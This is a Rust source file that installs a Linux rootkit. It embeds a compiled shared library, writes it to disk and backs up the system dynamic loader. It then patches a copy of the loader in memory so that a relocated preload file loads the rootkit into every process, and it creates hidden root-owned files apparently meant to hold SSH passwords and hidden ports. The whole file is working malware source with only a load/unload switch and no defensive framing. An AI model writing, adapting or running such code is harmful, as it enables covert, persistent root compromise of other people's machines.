use std::env;
use std::io::{Seek, SeekFrom, Write};
use std::fs::{self, copy, read, read_link, write, File, OpenOptions};
use std::ffi::c_char;
use std::os::unix::fs::{chown, PermissionsExt};
use std::os::fd::AsRawFd;
use std::path::Path;
use std::ptr;
use std::process::exit;

use libc::{mmap, munmap, strcpy, unlink, PROT_READ, PROT_WRITE, MAP_SHARED};
use config::{GID, HOME, PRELOAD, OLD_PRELOAD, LD_SO, LD_BAK, RK_SO};

const RK_BYTES: &[u8] = include_bytes!("../../target/release/librk.so");

fn build_root() {
    if !Path::new("/lib/libseconf/.sshpass").exists() {
        println!("[+] creating /lib/libseconf/.sshpass");
        let sshpass = File::create("/lib/libseconf/.sshpass").unwrap();
        sshpass.set_permissions(fs::Permissions::from_mode(0o644)).unwrap();
        chown("/lib/libseconf/.sshpass", Some(0), Some(GID.into())).unwrap();
    }

    if !Path::new("/lib/libseconf/.ports").exists() {
        println!("[+] creating /lib/libseconf/.ports");
        let ports = File::create("/lib/libseconf/.ports").unwrap();
        ports.set_permissions(fs::Permissions::from_mode(0o644)).unwrap();
        chown("/lib/libseconf/.ports", Some(0), Some(GID.into())).unwrap();
    }
}

fn load_ld(path: &str) {
    let version = read("/proc/version").unwrap();

    let os = std::str::from_utf8(&version).unwrap();
    match os {
        s if s.contains("Debian") => println!("[+] installing for debian :)"),
        s if s.contains("Ubuntu") => println!("[+] installing for ubuntu :)"),
        s if s.contains("el5") || s.contains("el6") || s.contains("el7") => println!("[+] installing for centos :)"),
        s if s.contains("SUSE") => println!("[+] installing for suse :)"),
        s if s.contains("Red Hat") => println!("[+] installing for rhel :)"),
        _ => println!("[?] unknown distro.. continuing anyways"),
    };

    println!("[+] unlinking {}", RK_SO);
    unsafe { unlink(RK_SO.as_ptr() as *const c_char) };

    println!("[+] writing rootkit to {}", path);
    write(path, RK_BYTES).unwrap();
    chown(HOME, Some(0), Some(GID.into())).unwrap();

    build_root();
}

fn unload_ld() {
    println!("[+] unloading rootkit");
    unsafe { unlink(PRELOAD.as_ptr() as *const c_char) };

    let ld_path = read_link(LD_SO).unwrap();
    if let Some(first) = ld_path.to_str().unwrap().chars().next() {
        match first {
            '/' => {
                match fs::rename(LD_BAK, ld_path) {
                    Ok(_) => println!("[+] unloaded successfully"),
                    Err(e) => println!("[!] unload failed: {}", e),
                }
            },
            _ => { 
                match fs::rename(LD_BAK, "/lib64/".to_owned()+ld_path.to_str().unwrap()) {
                    Ok(_) => println!("[+] unloaded successfully"),
                    Err(e) => println!("[!] unload failed: {}", e),
                }
            },
        };
    } else {
        println!("[!] dynamic loader not found? exiting now");
        exit(1);
    }

    exit(0);
}

fn patch_ld() {
    let ld_path = read_link(LD_SO).unwrap();
    if let Some(first) = ld_path.to_str().unwrap().chars().next() {
        match first {
            '/' => {
                println!("[+] copying {} to /lib/libldp.so for patching", ld_path.display());
                copy(ld_path.clone(), "/lib/libldp.so").expect(format!("[!] failed to copy {}", ld_path.display()).as_str());
            },
            _ => { 
                println!("[+] copying {} to /lib/libldp.so for patching", ld_path.display());
                copy("/lib64/".to_owned()+ld_path.to_str().unwrap(), LD_BAK).expect(format!("[!] failed to copy {}", ld_path.display()).as_str());
            },
        };
    } else {
        println!("[!] dynamic loader not found? exiting now");
        exit(1);
    }

    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .open("/lib/libldp.so")
        .expect("[!] failed to open /lib/libldp.so");

    let file_size = file.metadata().expect("[!] failed to /lib/libldp.so size").len() as usize;

    let fd = file.as_raw_fd();
    let map = unsafe { mmap(ptr::null_mut(), file_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) };

    if map == libc::MAP_FAILED {
        panic!("[!] mmap failed");
    }

    let map_slice = unsafe { std::slice::from_raw_parts_mut(map as *mut u8, file_size) };
    if let Some(ld_home_pos) = map_slice.windows(HOME.as_bytes().len()).position(|window| window == HOME.as_bytes()) {
        let ptr = unsafe { map.offset(ld_home_pos as isize) as *mut i8 };

        println!("[+] overwriting {} with {}", HOME, OLD_PRELOAD);
        unsafe { strcpy(ptr, OLD_PRELOAD.as_ptr() as *const c_char) };
        unsafe { munmap(map, file_size) };

        file.seek(SeekFrom::End(0)).expect("[-] failed to find end of file");
        file.write_all(OLD_PRELOAD.as_bytes()).expect(format!("[-] failed to append {}", OLD_PRELOAD).as_str());
    } else if let Some(preload_pos) = map_slice.windows(OLD_PRELOAD.as_bytes().len()).position(|window| window == OLD_PRELOAD.as_bytes()) {
        let ptr = unsafe { map.offset(preload_pos as isize) as *mut i8 };

        println!("[+] overwriting {} with {}", OLD_PRELOAD, PRELOAD);
        unsafe { strcpy(ptr, PRELOAD.as_ptr() as *const c_char) };
        unsafe { munmap(map, file_size) };

        file.seek(SeekFrom::End(0)).expect("[-] failed to find end of file");
        file.write_all(PRELOAD.as_bytes()).expect(format!("[-] failed to append {}", PRELOAD).as_str());
    } else {
        println!("[!] dynamic loader not found? exiting now");
        exit(1);
    }

    match fs::rename("/lib/libldp.so", ld_path) {
        Ok(_) => {
            println!("[+] patched successfully");
            write(PRELOAD, format!("{}\n", RK_SO).as_bytes()).unwrap();
        }
        Err(e) => println!("[!] patch failed: {}", e),
    }

    exit(0);
}

fn backup_ld() {
    let ld_path = read_link(LD_SO).unwrap();
    if let Some(first) = ld_path.to_str().unwrap().chars().next() {
        match first {
            '/' => {
                println!("[+] backing up {}", LD_SO);
                copy(ld_path, LD_BAK).expect(format!("[!] failed to backup {}", LD_SO).as_str());
            },
            _ => { 
                println!("[+] backing up {}", LD_SO);
                copy("/lib64/".to_owned()+ld_path.to_str().unwrap(), LD_BAK).expect(format!("[!] failed to backup {}", LD_SO).as_str());
            },
        };
    } else {
        println!("[!] dynamic loader not found? exiting now");
        exit(1);
    }
}

// lol - https://hup.hu/node/182880
fn main() {
    let args: Vec<String> = env::args().collect();
    
    if args.len() < 2 { 
        println!("[!] no argument found");
        println!("[!] please use load or unload");
        exit(1);
    }

    // load currently segfaults if the kit is loaded
    match args[1].as_str() {
        "load" => {
            println!("[+] loading rooktit");
            if Path::new(HOME).exists() {
                println!("[!] rootkit already installed, please unload first");
                exit(1);
            } else {
                println!("[+] {} not found. creating now", HOME);
                fs::create_dir_all(HOME).expect(format!("[!] failed to create {}", HOME).as_str());
                chown(HOME, Some(0), Some(GID.into())).unwrap();
                backup_ld();
            }

            load_ld(RK_SO);
            patch_ld();
        },
        "unload" => {
            unload_ld();
        }
        _ => {
            println!("[-] invalid argument");
            exit(1);
        },
    }

    exit(0);
}
